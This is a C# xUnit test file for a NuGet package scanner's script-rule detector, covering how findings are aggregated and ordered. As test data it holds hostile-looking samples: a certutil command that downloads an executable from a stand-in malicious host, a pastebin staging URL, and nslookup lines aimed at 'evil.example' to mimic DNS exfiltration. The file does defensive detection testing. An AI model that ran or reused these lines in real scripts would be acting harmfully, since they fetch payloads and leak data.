namespace Silvergun.PackageAnalysis.NuGet.Tests;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

using Silvergun;

using Xunit;

/// <summary>
/// Aggregation and ordering contract of <see cref="ScriptRuleScanner"/> (<c>docs/agent/tasks/script-rule-precision.md</c>,
/// chosen design §2): matches are collapsed to <b>one finding per (rule, file)</b> carrying the first match's
/// line/excerpt/severity/confidence/tags plus an <see cref="ScriptFinding.Occurrences"/> count, and the returned list is
/// deterministically ordered (path ordinal, then line, then rule id). Previously one alternation rule matching a file N
/// times produced N findings, inflating both the report and the <c>--strict</c> gate.
///
/// Scripts are staged as plain temp files driven through the public <see cref="ScriptRuleScanner.Scan"/> entry point, so
/// no package/zip is involved; the final test is the recall regression guard over the real <see cref="PackageFixture"/>
/// malicious-script package — precision work must never cost detection.
/// </summary>
public sealed class ScriptFindingAggregationTests : IClassFixture<PackageFixture>
{
    #region Constructors
    public ScriptFindingAggregationTests(PackageFixture fixture) => this.fixture = fixture;
    #endregion

    #region Methods
    // One rule matching the same file N times yields exactly ONE finding for that rule, counting N occurrences and
    // carrying the FIRST match's line, excerpt, severity, confidence and tags (line 1 here is a benign header, so the
    // first match is line 2 — not the last one, and not a synthesized zero).
    [Fact]
    public void Scan_SameRuleMatchesFileManyTimes_AggregatesWithOccurrenceCount()
    {
        using var dir = new TempDir();
        const int repeats = 5;
        var lines = new List<string> { "Write-Host 'installing'" };
        lines.AddRange(Enumerable.Repeat(PastebinLine, repeats));
        var path = dir.WriteFile("install.ps1", string.Join("\n", lines) + "\n");

        var findings = Scan((path, "tools/install.ps1"));

        Assert.NotEmpty(findings);
        AssertOneFindingPerRuleAndFile(findings);

        var repeated = findings.Where(f => f.Occurrences > 1).ToArray();
        Assert.NotEmpty(repeated);
        Assert.All(repeated, f =>
        {
            Assert.Equal(repeats, f.Occurrences);
            Assert.Equal(2, f.StartLine);                              // the FIRST match's line
            Assert.Equal("tools/install.ps1", f.RelativePath);
            Assert.Equal(ScriptFindingSource.Script, f.Source);
            Assert.False(string.IsNullOrEmpty(f.Excerpt));             // first match's excerpt ...
            Assert.False(string.IsNullOrEmpty(f.Severity));            // ... severity ...
            Assert.False(string.IsNullOrEmpty(f.Confidence));          // ... confidence ...
            Assert.NotEmpty(f.Tags);                                   // ... and tags all survive aggregation
        });
    }

    // Aggregation is per (rule, file) — never across them. Two files matching the same rule stay two findings, and two
    // different rules matching one file stay two findings.
    [Fact]
    public void Scan_DistinctRulesOrFiles_RemainSeparateFindings()
    {
        using var dir = new TempDir();
        var first = dir.WriteFile("a.ps1", PastebinLine + "\n");
        var second = dir.WriteFile("b.ps1", PastebinLine + "\n" + CertutilLine + "\n");

        var findings = Scan((first, "tools/a.ps1"), (second, "tools/b.ps1"));

        AssertOneFindingPerRuleAndFile(findings);

        // The same rule in two files: two findings, one per path.
        var shared = findings.GroupBy(f => f.RuleId, StringComparer.OrdinalIgnoreCase)
            .Where(g => g.Count() > 1)
            .ToArray();
        Assert.NotEmpty(shared);
        Assert.All(shared, g => Assert.Equal(g.Count(), g.Select(f => f.RelativePath).Distinct(StringComparer.Ordinal).Count()));

        // Two different rules in one file: two findings, distinct rule ids.
        var inSecond = findings.Where(f => f.RelativePath == "tools/b.ps1").ToArray();
        Assert.True(inSecond.Select(f => f.RuleId).Distinct(StringComparer.OrdinalIgnoreCase).Count() >= 2,
            "the second script trips two different rules, which must not be folded together.");
        Assert.Contains(findings, f => f.RelativePath == "tools/a.ps1");
    }

    // The returned order is deterministic and content-derived — path (ordinal), then start line, then rule id — so two
    // scans of the same package produce byte-identical reports regardless of input/enumeration order.
    [Fact]
    public void Scan_Findings_AreOrderedDeterministically()
    {
        using var dir = new TempDir();
        var z = dir.WriteFile("z.ps1", PastebinLine + "\n");
        var a = dir.WriteFile("a.ps1", "# header\n" + PastebinLine + "\n" + CertutilLine + "\n");
        var m = dir.WriteFile("m.props", PastebinLine + "\n");

        // Deliberately supplied out of order, and reversed on the second pass.
        var findings = Scan((z, "tools/z.ps1"), (a, "build/a.ps1"), (m, "build/m.props"));
        var reversed = Scan((m, "build/m.props"), (a, "build/a.ps1"), (z, "tools/z.ps1"));

        Assert.NotEmpty(findings);
        var expected = findings
            .OrderBy(f => f.RelativePath, StringComparer.Ordinal)
            .ThenBy(f => f.StartLine)
            .ThenBy(f => f.RuleId, StringComparer.Ordinal)
            .ToArray();
        Assert.Equal(expected.Select(Key), findings.Select(Key));
        Assert.Equal(findings.Select(Key), reversed.Select(Key));   // input order cannot change the report
    }

    // Recall regression guard (acceptance criterion): the precision fix must not cost detection. The real malicious
    // .ps1 / .psm1 / .targets fixtures still produce findings, and every one is Source=Script — so they all still gate
    // --strict, unlike the advisory manifest findings.
    [Fact]
    public void Scan_MaliciousScript_StillDetected()
    {
        var scan = PackageScanner.Scan(fixture.PkgScriptPath);
        Assert.True(scan.IsSuccess, scan.Message);
        var findings = scan.Value.ScriptFindings;

        foreach (var script in new[] { "/install.ps1", "/module.psm1", ".targets" })
            Assert.Contains(findings, f =>
                Norm(f.RelativePath).EndsWith(script, StringComparison.Ordinal)
                && !string.IsNullOrEmpty(f.RuleId)
                && f.Source == ScriptFindingSource.Script
                && f.Occurrences >= 1);

        Assert.All(
            findings.Where(f => !Norm(f.RelativePath).EndsWith(".nuspec", StringComparison.OrdinalIgnoreCase)),
            f => Assert.Equal(ScriptFindingSource.Script, f.Source));
        Assert.Contains(findings, f => f.Source == ScriptFindingSource.Script);
        AssertOneFindingPerRuleAndFile(findings);
    }

    // The report-level list is ordered GLOBALLY, not per source: script and manifest findings are one sorted sequence
    // (path ordinal, then start line, then rule id). PackageScanner.ScanScripts concatenates the script findings with
    // the nuspec findings, so without the re-sort the manifest's findings would always trail the scripts' — here the
    // nuspec sorts FIRST ("PkgMixedOrder.nuspec" < "build/..." < "tools/..." ordinally), which pins the sort.
    [Fact]
    public void Scan_ScriptAndNuspecFindings_AreGloballyOrdered()
    {
        using var dir = new TempDir();
        var nupkg = WriteMixedPackage(dir);

        var scan = PackageScanner.Scan(nupkg, resolveReferences: false, runYara: false);
        Assert.True(scan.IsSuccess, scan.Message);
        var findings = scan.Value.ScriptFindings;

        // Both sources really are present, else the ordering assertion below would be vacuous.
        Assert.Contains(findings, f => f.Source == ScriptFindingSource.PackageMetadata);
        Assert.Contains(findings, f => f.Source == ScriptFindingSource.Script);
        Assert.True(findings.Select(f => f.RelativePath).Distinct(StringComparer.Ordinal).Count() >= 3,
            "the fixture must produce findings in the nuspec and in both scripts.");

        var expected = findings
            .OrderBy(f => f.RelativePath, StringComparer.Ordinal)
            .ThenBy(f => f.StartLine)
            .ThenBy(f => f.RuleId, StringComparer.Ordinal)
            .ToArray();
        Assert.Equal(expected.Select(Key), findings.Select(Key));

        // The load-bearing consequence: the manifest's findings are interleaved by path, not appended at the end.
        Assert.Equal(ScriptFindingSource.PackageMetadata, findings[0].Source);
        Assert.EndsWith(".nuspec", findings[0].RelativePath, StringComparison.OrdinalIgnoreCase);
    }

    // Aggregation keeps the LOWEST StartLine of the rule's matches in that file — plus that match's excerpt — not
    // whichever match the engine happened to emit first. The engine's emission order is per pattern, not per position:
    // BD000705 ("Data Exfiltration (DNS)") lists "dns.lookup" before "nslookup", so for this file it emits the line-23
    // match BEFORE the line-2 one (verified against the unaggregated matches). A `First()`-based aggregation therefore
    // reports line 23 and the wrong excerpt; MinBy(StartLine) reports line 2. The excerpts are made distinguishable by
    // separating the two matches with filler lines, so the retained excerpt identifies which match was kept.
    [Fact]
    public void Aggregate_MatchesOutOfLineOrder_KeepsLowestStartLine()
    {
        using var dir = new TempDir();
        var lines = new List<string> { "# header", "nslookup evil.example" };
        lines.AddRange(Enumerable.Range(0, 20).Select(i => $"Write-Host 'benign {i}'"));
        lines.Add("dns.lookup('evil.example')");
        var path = dir.WriteFile("dns.ps1", string.Join("\n", lines) + "\n");

        var findings = Scan((path, "tools/dns.ps1"));

        var dns = Assert.Single(findings, f => f.RuleId.Equals("BD000705", StringComparison.OrdinalIgnoreCase));
        Assert.Equal(2, dns.Occurrences);                       // both matches counted ...
        Assert.Equal(2, dns.StartLine);                         // ... and the surviving one is the earliest in the file
        Assert.Contains("nslookup", dns.Excerpt!);              // the kept match's own excerpt ...
        Assert.DoesNotContain("dns.lookup", dns.Excerpt!);      // ... not the later match's
    }
    #endregion

    #region Methods — helpers
    // A package producing findings in BOTH sources: two scripts (Script) plus a manifest whose pastebin <projectUrl>
    // survives prose redaction (PackageMetadata). The names are chosen so that ordinal path order puts the manifest
    // first, ahead of "build/..." and "tools/...", which no concatenation order could produce by accident.
    private static string WriteMixedPackage(TempDir dir)
    {
        const string id = "PkgMixedOrder";
        var nuspec = NupkgBuilder.NuspecXml(
            id, "1.0.0", "Silvergun Tests", "Global script/nuspec finding ordering regression package.",
            "netstandard2.0", [], projectUrl: "https://pastebin.com/raw/aBcD1234");
        var nupkg = Path.Combine(dir.Root, $"{id}.1.0.0.nupkg");
        NupkgBuilder.WriteNupkg(nupkg,
        [
            ($"{id}.nuspec", Encoding.UTF8.GetBytes(nuspec)),
            ("build/aaa.props", Encoding.UTF8.GetBytes(PastebinLine + "\n")),
            ("tools/zzz.ps1", Encoding.UTF8.GetBytes("# header\n" + PastebinLine + "\n" + CertutilLine + "\n")),
        ]);
        return nupkg;
    }

    private static IReadOnlyList<ScriptFinding> Scan(params (string FullPath, string RelativePath)[] scripts) =>
        new ScriptRuleScanner().Scan(scripts.Select(s => new PackageScript(s.RelativePath, s.FullPath, PackageItemRole.Tools)));

    // The aggregation invariant: (rule id, relative path) is unique across the whole result.
    private static void AssertOneFindingPerRuleAndFile(IReadOnlyList<ScriptFinding> findings)
    {
        var keys = findings.Select(f => (f.RuleId.ToUpperInvariant(), f.RelativePath)).ToArray();
        Assert.Equal(keys.Distinct().Count(), keys.Length);
        Assert.All(findings, f => Assert.True(f.Occurrences >= 1, "Occurrences must always be at least 1."));
    }

    private static (string, int, string) Key(ScriptFinding f) => (f.RelativePath, f.StartLine, f.RuleId);

    private static string Norm(string path) => path.Replace('\\', '/');
    #endregion

    #region Fields
    // High-confidence, single-rule content (BD000500 "Pastebin"): one match per line, so occurrence counting is exact.
    private const string PastebinLine = "$stage = 'https://pastebin.com/raw/aBcD1234'";

    // A second, different rule (LOLBAS certutil) so "distinct rules stay separate" is exercised with real rule ids.
    private const string CertutilLine = "Start-Process certutil -ArgumentList '-urlcache','-f','http://malicious.example/s.exe'";

    private readonly PackageFixture fixture;
    #endregion

    #region Child types
    // A self-cleaning temp directory (mirrors YaraScanDirectoryTests); WriteFile returns the absolute path written.
    private sealed class TempDir : IDisposable
    {
        public TempDir()
        {
            Root = Path.Combine(Path.GetTempPath(), "silvergun-script-agg-" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(Root);
        }

        public string Root { get; }

        public string WriteFile(string name, string content)
        {
            var full = Path.Combine(Root, name);
            File.WriteAllText(full, content);
            return full;
        }

        public void Dispose()
        {
            try
            {
                if (Directory.Exists(Root))
                    Directory.Delete(Root, recursive: true);
            }
            catch (Exception ex) when (ex is IOException or UnauthorizedAccessException) { /* best-effort temp cleanup */ }
        }
    }
    #endregion
}
